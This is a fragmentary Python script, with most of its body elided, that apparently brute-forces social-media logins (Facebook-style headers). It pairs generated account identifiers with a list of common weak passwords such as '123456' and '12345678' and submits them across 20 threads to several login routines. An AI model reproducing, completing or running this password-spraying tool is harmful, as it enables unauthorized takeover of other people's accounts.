...
def mix():
  ...
  with tred(max_workers=20) as king_xd:
    ...
    for guru in user:
      idf = kode+guru
      pwv = ['12345678','123456','1234567','123123']
      if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,idf,pwv)
...
def m5(idf,pwv):
 ...
 try:
  for ps in pwv:
   ...
   'email': idf,  # Replace with the actual email
   ...
   header_freefb = {
    ...
    'viewport-width': '511'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
